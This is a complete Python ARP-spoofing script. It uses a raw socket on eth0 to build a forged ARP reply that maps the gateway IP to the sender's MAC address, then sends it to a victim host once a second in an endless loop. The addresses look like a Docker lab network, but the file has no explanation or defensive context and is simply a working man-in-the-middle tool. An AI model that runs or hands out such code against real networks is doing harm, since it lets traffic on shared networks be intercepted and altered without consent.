from time import *
import socket

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
s.bind(("eth0",socket.htons(0x0800)))

def construct_reply(spoofer_mac, victim_mac, victim_ip, gateway_ip):
    
    htype = b'\x00\x01'
    protype = b'\x08\x00'
    hsize = b'\x06'
    psize = b'\x04'
    opcode = b'\x00\x02'
    code = b'\x08\x06'
    ethernet = victim_mac + spoofer_mac + code
    arp_trace = ethernet + htype + protype + hsize + psize + opcode + spoofer_mac + gateway_ip + victim_mac + victim_ip
    return arp_trace

def convert_mac_to_hex(mac):
    mac_list = mac.split(':')
    hex_mac = bytes.fromhex(mac_list[0])
    for element in mac_list[1:]:
        hex_mac = hex_mac + bytes.fromhex(element)
    return hex_mac

paquete1 = construct_reply(convert_mac_to_hex('02:42:ac:12:00:04'), convert_mac_to_hex('02:42:ac:12:00:03'), socket.inet_aton('172.18.0.3'), socket.inet_aton('172.18.0.2'))
#paquete1 = construct_reply(b'\x02\x42\xac\x12\x00\x04', b'\x02\x42\xac\x12\x00\x02', socket.inet_aton('172.18.0.2'), socket.inet_aton('172.18.0.3'))


while True:
    s.send(paquete1)
    sleep(1)